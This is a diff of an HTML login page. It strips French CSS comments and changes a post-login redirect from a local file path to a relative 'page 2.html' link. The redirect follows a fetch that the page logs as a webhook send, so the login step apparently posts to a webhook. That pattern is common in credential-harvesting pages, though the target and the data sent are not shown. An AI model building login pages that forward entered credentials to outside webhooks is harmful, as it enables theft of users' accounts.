@@ -14,17 +14,17 @@
             height: 100vh;
             margin: 0;
             position: relative;
-            padding: 0; /* Enlève tout padding du body */
+            padding: 0;
         }
         .login-container {
             background: white;
             padding: 25px;
-            width: 350px; /* Largeur réduite à 350px */
+            width: 350px;
             text-align: left;
             position: relative;
             border-radius: 0;
             box-shadow: 0 4px 8px rgba(0,0,0,0.2);
-            margin-top: -112px; /* Ajuste la position vers le haut d'environ 3 cm (112px) */
+            margin-top: -112px;
         }
         .header-container {
             display: flex;
@@ -181,7 +181,8 @@
                 })
                 .then(response => {
                     if (response.ok) {
-                        window.location.href = 'file:///C:/Users/userl/Desktop/lunar%20site%20html/page%202.html';
+                        // Redirection vers la page 2, en utilisant un chemin relatif
+                        window.location.href = 'page%202.html';
                     } else {
                         console.error('Erreur lors de l\'envoi du webhook');
                     }
